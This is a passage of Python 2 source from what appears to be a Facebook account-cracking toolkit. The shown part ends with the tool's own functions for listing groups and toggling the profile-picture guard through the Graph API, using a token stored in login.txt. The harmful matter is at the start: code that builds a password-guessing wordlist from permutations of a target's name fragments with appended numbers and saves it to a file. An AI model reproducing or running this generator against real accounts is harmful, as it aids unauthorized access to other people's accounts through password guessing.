            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;97m=> \x1b[1;97mAuto Save \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except IOError as e:
            print '\x1b[1;97m=> \x1b[1;91mFailed Creat file'
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            menu()

def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;92mWaiting \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;97mTotal Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;97m=> \x1b[1;97mAuto Save \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;97m=> \x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;97m=> \x1b[1;91mStopped'
            raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;97m=> \x1b[1;91mGroup not found'
            raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m=> \x1b[1;97m=> \xe2\x9c\x96] Cek Connection'
            keluar()
        except IOError:
            print '\x1b[1;97m=> \x1b[1;91mFile Error'
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            menu()

def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97m=> \x1b[1;92mAktive'
        raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;97m=> \x1b[1;97m=> \x1b[1;91mNonAktive'
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;97m=> \x1b[1;91mError'
            keluar()


if __name__ == '__main__':
    login()
